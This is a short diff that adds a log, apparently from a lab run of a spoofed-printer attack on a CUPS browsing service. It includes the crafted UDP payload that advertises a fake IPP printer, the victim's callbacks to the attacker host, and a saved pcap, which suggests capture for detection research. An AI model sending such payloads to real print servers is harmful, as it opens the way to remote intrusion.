@@ -1,0 +1,8 @@
+2026-10-28 12:00:15,660 INFO fake IPP printer listening on tcp/8631
+2026-10-28 12:00:16,662 INFO sending 1 packet(s) to 172.20.0.10:631 payload=b'0 3 ipp://172.20.0.1:8631/printers/Office-Printer2 "Office 2nd floor" "HP LaserJet"\n'
+2026-10-28 12:00:16,720 WARNING CALLBACK: victim 172.20.0.10:50320 -> fake printer | POST /printers/Office-Printer2 HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:00:16,722 WARNING CALLBACK: victim 172.20.0.10:50322 -> fake printer | POST /printers/Office-Printer2 HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:00:16,723 WARNING CALLBACK: victim 172.20.0.10:50336 -> fake printer | POST /printers/Office-Printer2 HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 12:00:17,723 INFO watching 10 s for the victim to connect back ...
+2026-10-28 12:00:27,731 WARNING RESULT: victim 172.20.0.10 opened TCP connection to 172.20.0.1:8631
+2026-10-28 12:00:27,736 INFO saved 39 packets to pcap_files/05_var2_spoofed_src.pcap
